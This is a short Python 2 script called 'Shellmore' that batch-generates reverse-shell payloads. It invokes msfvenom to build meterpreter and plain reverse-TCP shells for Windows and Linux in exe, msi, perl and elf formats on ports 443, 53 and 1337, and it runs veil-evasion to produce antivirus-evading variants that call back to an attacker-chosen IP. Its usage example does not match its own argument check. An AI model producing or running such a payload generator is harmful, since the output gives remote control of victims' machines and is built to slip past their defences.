import sys
import os

ports = [443,53,1337]


def generatePayload():
	source_ip = str(sys.argv[1])
	dest_folder = str(sys.argv[2])
	os.system('mkdir %s/linux -p' % dest_folder);
	os.system('mkdir %s/win -p' % dest_folder);

	for port in ports:
   		os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=%s lport=%s -f exe -o %s/win/meterpreter_reverse_%s.exe' % (source_ip, port, dest_folder,port));
   		os.system('msfvenom -p windows/meterpreter/reverse_tcp lhost=%s lport=%s -f msi -o %s/win/meterpreter_reverse_%s.msi' % (source_ip, port, dest_folder,port));
   		os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=%s lport=%s -f perl -o %s/linux/meterpreter_reverse_%s.pl' % (source_ip, port, dest_folder,port));
   		os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=%s lport=%s -f elf -o %s/linux/meterpreter_reverse_%s_elf' % (source_ip, port, dest_folder,port));    
   		os.system('msfvenom -p windows/shell_reverse_tcp lhost=%s lport=%s -f exe -o %s/win/shell_reverse_%s.exe' % (source_ip, port, dest_folder,port));
   		os.system('veil-evasion -p python/meterpreter/rev_tcp -c lhost=%s lport=%s -o veil_reverse_%s' % (source_ip, port,port)); 

	os.system('mv /usr/share/veil-output/compiled/veil_reverse* %s/win/' % dest_folder)

print "############################################################"
print "####                     Shellmore                      ####"
print "####            Generate various payload                ####"
print "#### exe, msi, pl, elf and veil generated payload       ####"
print "####              M0r3 sh3llz m0re fun :3               ####"
print "############################################################"   

if len(sys.argv) < 4: 
	print "Example$ python shellmore.py 127.0.0.1 desination_folder"
else:
	generatePayload()                     
